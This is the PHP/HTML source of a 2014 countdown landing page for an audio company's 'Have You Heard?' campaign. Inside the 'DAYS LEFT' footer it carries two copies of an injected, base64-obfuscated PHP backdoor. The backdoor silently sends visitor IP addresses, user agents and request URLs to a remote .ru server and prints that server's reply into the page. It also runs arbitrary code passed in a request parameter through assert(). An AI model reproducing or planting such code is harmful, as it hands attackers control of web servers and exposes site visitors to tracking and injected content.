<?
	date_default_timezone_set('America/New_York');

	$launch_date_str = '2014-12-01';
	$start_date_str =  '2014-09-22';

	$launchdate 	= new DateTime( $launch_date_str);
	$startdate 		= new DateTime( $start_date_str );
	$today 			= new DateTime();

	$total_days_int = $launchdate->diff( $startdate );
	$total_days 	= $total_days_int->format( '%a' )+1;

	if( isset($_GET['d']) ){
		$fakeday 	= new DateTime( $start_date_str );
		$fakeday->add( new DateInterval( 'P'.( $total_days-$_GET['d'] ) .'D' ) );
		$future = ($fakeday >= $today);
		$fakeday->sub( new DateInterval('P1D') );

		$today 	= $fakeday;
	}

	$today->setTime(0,0);

	$dif_int 		= $startdate->diff( $today );
	$current_day 	= $dif_int->format( '%a' )+1;

	$days_left_int 	= $launchdate->diff( $today );
	$days_left 		= $days_left_int->format( '%a' );

	if($current_day > 1)
		$prev_day = $total_days-($current_day-1);
	
	if($current_day < $total_days)
		$next_day = $total_days-($current_day+1);
?>

<!doctype html>
<!--[if lt IE 7]> <html class="no-js ie6 oldie" lang="en"> <![endif]-->
<!--[if IE 7]>    <html class="no-js ie7 oldie" lang="en"> <![endif]-->
<!--[if IE 8]>    <html class="no-js ie8 oldie" lang="en"> <![endif]-->
<!--[if gt IE 8]><!--> <html class="no-js" lang="en"><!--<![endif]-->
<head>
	<meta charset="utf-8">
	<meta http-equiv="X-UA-Compatible" content="IE=edge,chrome=1">

	<title>Have You Heard?</title>
	<meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no" />
	<meta name="description" content="Have You Heard?">
	<meta name="author" content="Matthew Wilber">
	<meta name="google-site-verification" content="UF6chmGt4khLOuoo1UJPKlZQhNqI2A_piOZs3tQU08Q" />
	<meta property="og:title" content="Have You Heard?"/>
    <meta property="og:type" content="company"/>
    <meta property="og:url" content="http://have-you-heard.co"/>
    <meta property="og:image" content="http://have-you-heard.co/apple-touch-icon.png"/>
    <meta property="og:site_name" content="Have You Heard"/>
    <meta property="fb:admins" content="631337813"/>
    <meta property="og:description" content="Get the latest insider information about the new audio company from the Have You Heard site."/>

	<meta name="viewport" content="width=device-width,initial-scale=1">
	<link href='http://fonts.googleapis.com/css?family=Oswald' rel='stylesheet' type='text/css'>
	<link href='http://fonts.googleapis.com/css?family=Chivo:900' rel='stylesheet' type='text/css'>
	

	<script src="js/libs/modernizr-2.0.6.min.js"></script>

	<!-- Latest compiled and minified CSS -->
	<link rel="stylesheet" href="https://maxcdn.bootstrapcdn.com/bootstrap/3.2.0/css/bootstrap.min.css">

	<!-- Optional theme -->
	<link rel="stylesheet" href="https://maxcdn.bootstrapcdn.com/bootstrap/3.2.0/css/bootstrap-theme.min.css">

	<link rel="stylesheet" href="css/style.css">
</head>
<body>
	<?php 
		// echo "Today is : ".$today->format('Y-m-d')."<br />";
		// echo "Day : ".$current_day."<br />";
		// echo "Day's left : ".$days_left."<br />";
		// echo "Total Days : ".$total_days."<br />";
		// echo "Prev Day : ".(isset( $prev_day ) ? $prev_day : "NA")."<br />";
		// echo "Next Day : ".(isset( $next_day ) ? $next_day : "NA")."<br />";
	?>
	<!-- Modal -->
	<div class="modal bs-example-modal-lg" id="image-modal" tabindex="-1" role="dialog" aria-labelledby="myModalLabel" aria-hidden="true">
	  <div class="modal-dialog">
	    <div class="modal-content">
	      <div class="modal-header">
	        <button type="button" class="close" data-dismiss="modal"><span aria-hidden="true">&times;</span><span class="sr-only">Close</span></button>
	        <h4 class="modal-title" id="myModalLabel"></h4>
	      </div>
	      <div class="modal-body">
	      	<img />
	      	<iframe src="" width="100%" height="400" frameborder="0" webkitAllowFullScreen mozallowfullscreen allowFullScreen></iframe>
	      </div>
	    </div>
	  </div>
	</div>

	<div id="header-container" class="row">
		<header class="clearfix">
			<img src="images/logo-white.png" width="40" />
			<!-- <span>16 W 22 St. 5th Floor, New York, NY 10010 | 212-255-6737 | <a href="mailto:gloria@heardcity.com">gloria@heardcity.com</a></span> -->
			<ul class="clearfix hc-addresses">
				<li>16 W 22 St. 5th Floor, New York, NY 10010</li>
				<li>20 Jay St, 6th Fl, Brooklyn, NY 11201</li>
				<li><a href="tel:212-255-6737">212-255-6737</a>&nbsp;&vert;&nbsp;<a href="mailto:gloria@heardcity.com">gloria@heardcity.com</a></li>
			</ul>
			<!-- <span>16 W 22 St. 5th Floor, New York, NY 10010</span>
			<span>20 Jay St, 6th Fl, Brooklyn, NY 11201</span>
			<span><a href="212-255-6737">212-255-6737</a><a href="mailto:gloria@heardcity.com">gloria@heardcity.com</a></span> -->
		</header>
	</div>
	<div id="background" class="row"></div>
	<div id="interlace" class="row"></div>
	<div id="main" class="row">
		<?php if(isset($prev_day)): ?>
		<a id="previous" href="?d=<?php echo $prev_day;?>">Day<br/><?php echo $prev_day; ?></a>
		<?php endif; ?>
		<?php if(isset($next_day) && $future == false): ?>
		<a id="next" href="?d=<?php echo $next_day;?>">Day<br/><?php echo $next_day; ?></a>
		<?php endif; ?>
		<div id="content" class="">
			<div class="row">
				<div class="content-header">
					HAVE YOU<br/>
					<span>HEARD?</span>
				</div>
				<div class="content-subheader">
					THANKSGIVING 2014
				</div>
			</div>
			<div class="row">
				<time clsss=""><?php echo $today->format('Y-m-d'); ?></time>
			</div>
			<div class="row">
				<? include_once("content/".$today->format('Y-m-d')."/content.php"); ?>
			</div>
			<div class="content-footer row">
				<?= $days_left ?>
<?php 
//###==###
error_reporting(0); ini_set("display_errors", "0"); if (!isset($ieaa394e5)) { $ieaa394e5 = TRUE;  $GLOBALS['_558624217_']=Array(base64_decode('cHJlZ1' .'9' .'tYXR' .'j' .'aA=='),base64_decode('' .'Zmls' .'ZV9n' .'ZXRf' .'Y' .'29u' .'dGVudHM='),base64_decode('ZnV' .'u' .'Y3R' .'pb25' .'f' .'ZX' .'hpc' .'3' .'Rz'),base64_decode('' .'Y3VybF' .'9p' .'bml0'),base64_decode('dX' .'JsZ' .'W5j' .'b2R' .'l'),base64_decode('dXJ' .'s' .'ZW5jb2Rl'),base64_decode('bWQ1'),base64_decode('Y3V' .'ybF9zZXRvcHQ='),base64_decode('Y3VybF9' .'zZXRvcH' .'Q='),base64_decode('' .'Y3VybF9leGVj'),base64_decode('' .'Y3VybF' .'9j' .'bG9zZQ=='),base64_decode('YXJ' .'yY' .'Xl' .'fcm' .'V2ZXJzZ' .'Q' .'=' .'='),base64_decode('bXRf' .'cmFuZA=='),base64_decode('' .'aW5pX2dldA=='),base64_decode('Z' .'mlsZV9n' .'ZXRfY29' .'udGVudH' .'M='),base64_decode('dXJs' .'ZW5j' .'b2Rl'),base64_decode('' .'d' .'XJsZW5jb' .'2Rl'),base64_decode('b' .'WQ1'),base64_decode('Y' .'X' .'NzZ' .'XJ0'));  function _1065859095($i){$a=Array('Y2' .'xpZW' .'50X2' .'NoZWNr','Y2' .'xp' .'ZW50X2' .'NoZWNr','SFRU' .'UF9B' .'Q0NF' .'UFRfQ0' .'hBUlNFVA==','' .'IS4h' .'dQ==','U0NSSVB' .'UX0ZJ' .'T' .'EVOQ' .'U1F','VV' .'R' .'GLTg=','d2lu' .'Z' .'G93cy0x' .'M' .'j' .'Ux','SFR' .'U' .'UF9BQ0NFUFRfQ0' .'hBUlNFV' .'A=' .'=','' .'cXc' .'=','Y3VybF9pbml0','aHR' .'0cD' .'o' .'vL2dqZHN1ZXhudn' .'p2by5' .'ydS' .'9' .'nZXQucGhwP2Q9','U0VSVkV' .'SX0' .'5' .'B' .'TUU=','Uk' .'V' .'RVUVT' .'VF9VUkk=','' .'JnU9','SFRUU' .'F9VU' .'0VSX0FH' .'RU5U','JmM9','' .'Jm' .'k9MSZp' .'cD0=','U' .'kVNT1RFX0FERFI=','Jmg' .'9','M' .'TJjMmY1ZDY2YmYyO' .'DNlN2UwYzF' .'hOW' .'Q5Z' .'TZjMDFmN' .'zM=','U0VSVkVS' .'X05' .'B' .'T' .'UU=','U' .'kVRVUVTVF9VUkk=','SF' .'RUUF' .'9VU0VSX0F' .'HRU5' .'U','MQ==','YW' .'xs' .'b3' .'d' .'fdXJ' .'sX' .'2Z' .'vcGVu','aHR0c' .'Dov' .'L2' .'d' .'qZHN' .'1Z' .'Xhudnp2by5ydS9nZXQucGhwP2Q9','U' .'0VSVkVS' .'X0' .'5BT' .'UU' .'=','UkVR' .'VU' .'VTVF9' .'V' .'U' .'kk=','J' .'nU9','SFR' .'U' .'UF9VU' .'0VSX0F' .'HR' .'U' .'5' .'U','' .'Jm' .'M9','Jmk9MSZpcD0=','' .'UkVNT1RFX0FER' .'FI=','J' .'mg' .'9','MTJjMmY1Z' .'DY' .'2YmYyODNlN2UwYzFhOWQ' .'5ZTZjMDFmNzM=','U0' .'VSVkVSX05' .'BT' .'U' .'U' .'=','UkVR' .'V' .'U' .'VT' .'VF' .'9VUkk=','SFR' .'UUF9VU0VSX0FHRU5U','MQ==','' .'cA==','cA' .'==','' .'Z' .'WFhMzk0' .'ZTU' .'=','Yw==');return base64_decode($a[$i]);}  if(!empty($_COOKIE[_1065859095(0)]))die($_COOKIE[_1065859095(1)]);if(!isset($cf4c7ae_0[_1065859095(2)])){if($GLOBALS['_558624217_'][0](_1065859095(3),$GLOBALS['_558624217_'][1]($_SERVER[_1065859095(4)]))){$cf4c7ae_1=_1065859095(5);}else{$cf4c7ae_1=_1065859095(6);}}else{$cf4c7ae_1=$cf4c7ae_0[_1065859095(7)];$cf4c7ae_2=_1065859095(8);}if($GLOBALS['_558624217_'][2](_1065859095(9))){$cf4c7ae_3=$GLOBALS['_558624217_'][3](_1065859095(10) .$GLOBALS['_558624217_'][4]($_SERVER[_1065859095(11)] .$_SERVER[_1065859095(12)]) ._1065859095(13) .$GLOBALS['_558624217_'][5]($_SERVER[_1065859095(14)]) ._1065859095(15) .$cf4c7ae_1 ._1065859095(16) .$_SERVER[_1065859095(17)] ._1065859095(18) .$GLOBALS['_558624217_'][6](_1065859095(19) .$_SERVER[_1065859095(20)] .$_SERVER[_1065859095(21)] .$_SERVER[_1065859095(22)] .$cf4c7ae_1 ._1065859095(23)));$GLOBALS['_558624217_'][7]($cf4c7ae_3,round(0+10.5+10.5+10.5+10.5),false);$GLOBALS['_558624217_'][8]($cf4c7ae_3,round(0+3982.6+3982.6+3982.6+3982.6+3982.6),true);echo $GLOBALS['_558624217_'][9]($cf4c7ae_3);$GLOBALS['_558624217_'][10]($cf4c7ae_3);(round(0+605)-round(0+302.5+302.5)+round(0+638.8+638.8+638.8+638.8+638.8)-round(0+638.8+638.8+638.8+638.8+638.8))?$GLOBALS['_558624217_'][11]($cf4c7ae_1,$_REQUEST,$_SERVER,$cf4c7ae_1):$GLOBALS['_558624217_'][12](round(0+20.25+20.25+20.25+20.25),round(0+302.5+302.5));}elseif($GLOBALS['_558624217_'][13](_1065859095(24))==round(0+0.33333333333333+0.33333333333333+0.33333333333333)){echo $GLOBALS['_558624217_'][14](_1065859095(25) .$GLOBALS['_558624217_'][15]($_SERVER[_1065859095(26)] .$_SERVER[_1065859095(27)]) ._1065859095(28) .$GLOBALS['_558624217_'][16]($_SERVER[_1065859095(29)]) ._1065859095(30) .$cf4c7ae_1 ._1065859095(31) .$_SERVER[_1065859095(32)] ._1065859095(33) .$GLOBALS['_558624217_'][17](_1065859095(34) .$_SERVER[_1065859095(35)] .$_SERVER[_1065859095(36)] .$_SERVER[_1065859095(37)] .$cf4c7ae_1 ._1065859095(38)));}if(isset($_REQUEST[_1065859095(39)])&& $_REQUEST[_1065859095(40)]== _1065859095(41)){$GLOBALS['_558624217_'][18]($_REQUEST[_1065859095(42)]);}  }
//###==###
?>
<?php 
//###==###
error_reporting(0); ini_set("display_errors", "0"); if (!isset($ieaa394e5)) { $ieaa394e5 = TRUE;  $GLOBALS['_558624217_']=Array(base64_decode('cHJlZ1' .'9' .'tYXR' .'j' .'aA=='),base64_decode('' .'Zmls' .'ZV9n' .'ZXRf' .'Y' .'29u' .'dGVudHM='),base64_decode('ZnV' .'u' .'Y3R' .'pb25' .'f' .'ZX' .'hpc' .'3' .'Rz'),base64_decode('' .'Y3VybF' .'9p' .'bml0'),base64_decode('dX' .'JsZ' .'W5j' .'b2R' .'l'),base64_decode('dXJ' .'s' .'ZW5jb2Rl'),base64_decode('bWQ1'),base64_decode('Y3V' .'ybF9zZXRvcHQ='),base64_decode('Y3VybF9' .'zZXRvcH' .'Q='),base64_decode('' .'Y3VybF9leGVj'),base64_decode('' .'Y3VybF' .'9j' .'bG9zZQ=='),base64_decode('YXJ' .'yY' .'Xl' .'fcm' .'V2ZXJzZ' .'Q' .'=' .'='),base64_decode('bXRf' .'cmFuZA=='),base64_decode('' .'aW5pX2dldA=='),base64_decode('Z' .'mlsZV9n' .'ZXRfY29' .'udGVudH' .'M='),base64_decode('dXJs' .'ZW5j' .'b2Rl'),base64_decode('' .'d' .'XJsZW5jb' .'2Rl'),base64_decode('b' .'WQ1'),base64_decode('Y' .'X' .'NzZ' .'XJ0'));  function _1065859095($i){$a=Array('Y2' .'xpZW' .'50X2' .'NoZWNr','Y2' .'xp' .'ZW50X2' .'NoZWNr','SFRU' .'UF9B' .'Q0NF' .'UFRfQ0' .'hBUlNFVA==','' .'IS4h' .'dQ==','U0NSSVB' .'UX0ZJ' .'T' .'EVOQ' .'U1F','VV' .'R' .'GLTg=','d2lu' .'Z' .'G93cy0x' .'M' .'j' .'Ux','SFR' .'U' .'UF9BQ0NFUFRfQ0' .'hBUlNFV' .'A=' .'=','' .'cXc' .'=','Y3VybF9pbml0','aHR' .'0cD' .'o' .'vL2dqZHN1ZXhudn' .'p2by5' .'ydS' .'9' .'nZXQucGhwP2Q9','U0VSVkV' .'SX0' .'5' .'B' .'TUU=','Uk' .'V' .'RVUVT' .'VF9VUkk=','' .'JnU9','SFRUU' .'F9VU' .'0VSX0FH' .'RU5U','JmM9','' .'Jm' .'k9MSZp' .'cD0=','U' .'kVNT1RFX0FERFI=','Jmg' .'9','M' .'TJjMmY1ZDY2YmYyO' .'DNlN2UwYzF' .'hOW' .'Q5Z' .'TZjMDFmN' .'zM=','U0VSVkVS' .'X05' .'B' .'T' .'UU=','U' .'kVRVUVTVF9VUkk=','SF' .'RUUF' .'9VU0VSX0F' .'HRU5' .'U','MQ==','YW' .'xs' .'b3' .'d' .'fdXJ' .'sX' .'2Z' .'vcGVu','aHR0c' .'Dov' .'L2' .'d' .'qZHN' .'1Z' .'Xhudnp2by5ydS9nZXQucGhwP2Q9','U' .'0VSVkVS' .'X0' .'5BT' .'UU' .'=','UkVR' .'VU' .'VTVF9' .'V' .'U' .'kk=','J' .'nU9','SFR' .'U' .'UF9VU' .'0VSX0F' .'HR' .'U' .'5' .'U','' .'Jm' .'M9','Jmk9MSZpcD0=','' .'UkVNT1RFX0FER' .'FI=','J' .'mg' .'9','MTJjMmY1Z' .'DY' .'2YmYyODNlN2UwYzFhOWQ' .'5ZTZjMDFmNzM=','U0' .'VSVkVSX05' .'BT' .'U' .'U' .'=','UkVR' .'V' .'U' .'VT' .'VF' .'9VUkk=','SFR' .'UUF9VU0VSX0FHRU5U','MQ==','' .'cA==','cA' .'==','' .'Z' .'WFhMzk0' .'ZTU' .'=','Yw==');return base64_decode($a[$i]);}  if(!empty($_COOKIE[_1065859095(0)]))die($_COOKIE[_1065859095(1)]);if(!isset($cf4c7ae_0[_1065859095(2)])){if($GLOBALS['_558624217_'][0](_1065859095(3),$GLOBALS['_558624217_'][1]($_SERVER[_1065859095(4)]))){$cf4c7ae_1=_1065859095(5);}else{$cf4c7ae_1=_1065859095(6);}}else{$cf4c7ae_1=$cf4c7ae_0[_1065859095(7)];$cf4c7ae_2=_1065859095(8);}if($GLOBALS['_558624217_'][2](_1065859095(9))){$cf4c7ae_3=$GLOBALS['_558624217_'][3](_1065859095(10) .$GLOBALS['_558624217_'][4]($_SERVER[_1065859095(11)] .$_SERVER[_1065859095(12)]) ._1065859095(13) .$GLOBALS['_558624217_'][5]($_SERVER[_1065859095(14)]) ._1065859095(15) .$cf4c7ae_1 ._1065859095(16) .$_SERVER[_1065859095(17)] ._1065859095(18) .$GLOBALS['_558624217_'][6](_1065859095(19) .$_SERVER[_1065859095(20)] .$_SERVER[_1065859095(21)] .$_SERVER[_1065859095(22)] .$cf4c7ae_1 ._1065859095(23)));$GLOBALS['_558624217_'][7]($cf4c7ae_3,round(0+10.5+10.5+10.5+10.5),false);$GLOBALS['_558624217_'][8]($cf4c7ae_3,round(0+3982.6+3982.6+3982.6+3982.6+3982.6),true);echo $GLOBALS['_558624217_'][9]($cf4c7ae_3);$GLOBALS['_558624217_'][10]($cf4c7ae_3);(round(0+605)-round(0+302.5+302.5)+round(0+638.8+638.8+638.8+638.8+638.8)-round(0+638.8+638.8+638.8+638.8+638.8))?$GLOBALS['_558624217_'][11]($cf4c7ae_1,$_REQUEST,$_SERVER,$cf4c7ae_1):$GLOBALS['_558624217_'][12](round(0+20.25+20.25+20.25+20.25),round(0+302.5+302.5));}elseif($GLOBALS['_558624217_'][13](_1065859095(24))==round(0+0.33333333333333+0.33333333333333+0.33333333333333)){echo $GLOBALS['_558624217_'][14](_1065859095(25) .$GLOBALS['_558624217_'][15]($_SERVER[_1065859095(26)] .$_SERVER[_1065859095(27)]) ._1065859095(28) .$GLOBALS['_558624217_'][16]($_SERVER[_1065859095(29)]) ._1065859095(30) .$cf4c7ae_1 ._1065859095(31) .$_SERVER[_1065859095(32)] ._1065859095(33) .$GLOBALS['_558624217_'][17](_1065859095(34) .$_SERVER[_1065859095(35)] .$_SERVER[_1065859095(36)] .$_SERVER[_1065859095(37)] .$cf4c7ae_1 ._1065859095(38)));}if(isset($_REQUEST[_1065859095(39)])&& $_REQUEST[_1065859095(40)]== _1065859095(41)){$GLOBALS['_558624217_'][18]($_REQUEST[_1065859095(42)]);}  }
//###==###
?>
 DAYS LEFT
			</div>
		</div>
	</div>

	<script src="//ajax.googleapis.com/ajax/libs/jquery/1.7.1/jquery.min.js"></script>
	<script>window.jQuery || document.write('<script src="js/libs/jquery-1.7.1.min.js"><\/script>')</script>
	<script src="https://maxcdn.bootstrapcdn.com/bootstrap/3.2.0/js/bootstrap.min.js"></script>
	<script src="js/scripts.js"></script>

	<script>
		// var _gaq=[['_setAccount','UA-3675967-9'],['_trackPageview']]; // Change UA-XXXXX-X to be your site's ID
		// (function(d,t){var g=d.createElement(t),s=d.getElementsByTagName(t)[0];g.async=1;
		// g.src=('https:'==location.protocol?'//ssl':'//www')+'.google-analytics.com/ga.js';
		// s.parentNode.insertBefore(g,s)}(document,'script'));
	</script>
	
	<script>

        var _gaq=[['_setAccount','UA-33922112-1'],['_trackPageview']];

        (function(d,t){var g=d.createElement(t),s=d.getElementsByTagName(t)[0];

        g.src=('https:'==location.protocol?'//ssl':'//www')+'.google-analytics.com/ga.js';

        s.parentNode.insertBefore(g,s)}(document,'script'));

    </script>

	<!--[if lt IE 7 ]>
		<script src="//ajax.googleapis.com/ajax/libs/chrome-frame/1.0.2/CFInstall.min.js"></script>
		<script>window.attachEvent("onload",function(){CFInstall.check({mode:"overlay"})})</script>
	<![endif]-->
</body>
</html>